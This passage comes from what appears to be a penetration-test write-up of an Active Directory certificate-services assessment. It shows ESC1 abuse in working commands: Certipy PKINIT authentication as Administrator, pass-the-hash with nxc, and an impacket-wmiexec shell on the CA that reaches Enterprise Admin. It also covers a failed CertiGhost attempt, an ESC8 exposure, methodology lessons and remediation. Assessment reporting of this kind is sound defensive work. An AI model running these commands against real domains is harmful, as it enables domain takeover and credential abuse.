The certificate was then used for PKINIT against the forest-root domain controller:

"$CERTIPY" auth -pfx 'administrator_corp.pfx' -username 'Administrator' -domain 'corp.example' -dc-ip 192.0.2.20

The sanitised output demonstrated that the KDC accepted the certificate as the forest-root Administrator and issued a TGT:

[*] Certificate identities:
[*]     SAN UPN: 'administrator@corp.example'
[*]     SAN URL SID: 'S-1-5-21-1111111111-2222222222-3333333333-500'
[*] Using principal: 'administrator@corp.example'

The credential cache and NT hash were treated as sensitive assessment artefacts. They were not copied into notes, screenshots or the report without redaction.

Administrative Access Validation

The recovered credential was validated against the forest-root DC and the CA. The purpose was to confirm the level of access obtained, not to perform further domain-wide actions.

read -rs 'ADMIN_HASH?Administrator NT hash: '; echo; nxc smb 192.0.2.20 -d corp.example -u Administrator -H "$ADMIN_HASH"
nxc smb 192.0.2.30 -d corp.example -u Administrator -H "$ADMIN_HASH"

Both systems returned successful administrative authentication:

SMB  192.0.2.20  445  ROOT-DC01  [+] corp.example\Administrator:<REDACTED> (Pwn3d!)
SMB  192.0.2.30  445  CA01       [+] corp.example\Administrator:<REDACTED> (Pwn3d!)

A remote shell was opened on the CA to establish that the access was operational. The hash variable initially contained an LMHASH:NTHASH pair, so adding another leading colon caused Impacket to return too many values to unpack. Extracting the value after the final colon produced the expected 32-character NT hash.

NT_HASH="${ADMIN_HASH##*:}"; impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:$NT_HASH" 'corp.example/Administrator@192.0.2.30'

The session confirmed the privileged identity, the target hostname and the relevant group memberships:

C:\>whoami
corp\administrator
C:\>hostname
CA01
C:\>whoami /groups
BUILTIN\Administrators
CORP\Domain Admins
CORP\Schema Admins
CORP\Enterprise Admins
Mandatory Label\High Mandatory Level

No destructive actions, persistence mechanisms or additional credential extraction were required. The certificate issuance, successful PKINIT, administrative authentication and controlled command execution were sufficient to demonstrate forest-wide administrative compromise.

CertiGhost Validation Outcome

The CA build remained a valid patch-management concern and the request reached behaviour consistent with the callback-dependent processing path. Full CertiGhost exploitation was not demonstrated because the CA could not reach the rogue services from the available network position.

That distinction should be preserved in reporting. A version-based check can support a patching observation, and a failed callback can document the environmental constraint, but neither should be presented as a completed CertiGhost compromise. The demonstrated compromise arose from ESC1 and should be recorded as a separate certificate template misconfiguration.

The exercise also showed why simply swapping templates in a PoC is not a sound approach. A template that is vulnerable to ESC1 is not automatically suitable for CertiGhost. Each path relies on different template flags, permissions and network behaviour.

ESC8 Exposure

The CA also exposed HTTP Web Enrolment, which created an ESC8 condition. In a conventional ESC8 attack, a victim authenticates to an attacker-controlled relay service and the attacker relays that authentication to the CA's HTTP enrolment endpoint.

From this assessment position, the same broad network limitation remained relevant: the victim needed to initiate authentication to the relay listener. The office and client-VPN path did not permit the required inbound connection. An internal relay point could have changed that result, but one was not required once the direct ESC1 path had been demonstrated.

ESC8, ESC1 and CertiGhost should not be merged into a single issue merely because they involve the same CA. They have different root causes, prerequisites and remediation requirements.

Assessment Methodology Considerations

The first lesson was to understand the forest before relying on automated discovery. In a multi-domain forest, the authentication domain, default naming context, Configuration partition, CA host domain and template security principals may all differ.

The second lesson was to separate discovery from validation. An OS build check indicated that CertiGhost might apply, but template behaviour, enrolment permissions and callback reachability still had to be established.

The third lesson was to evaluate effective template rights from the current principal's position. A template may contain all the technical flags required by an attack but remain unusable because its enrolment ACL references a group from another domain.

The fourth lesson was to treat network direction as part of the exploit prerequisites. Successful outbound access from a VPN client did not imply that internal servers could initiate connections back to the client.

Certificate template enumeration remained necessary after the PoC failed. The CVE prompted review of the Certificate Authority, while a separate configuration issue provided the successful route to administrative access. The result depended on the forest structure, template permissions and network behaviour rather than successful exploitation of the original CVE.

Remediation

The affected authentication-capable template should be disabled or unpublished until its intended use and permissions have been reviewed. Broad principals such as Authenticated Users should be removed from enrolment and auto-enrolment permissions, with access restricted to the specific systems or service owners that require the template.
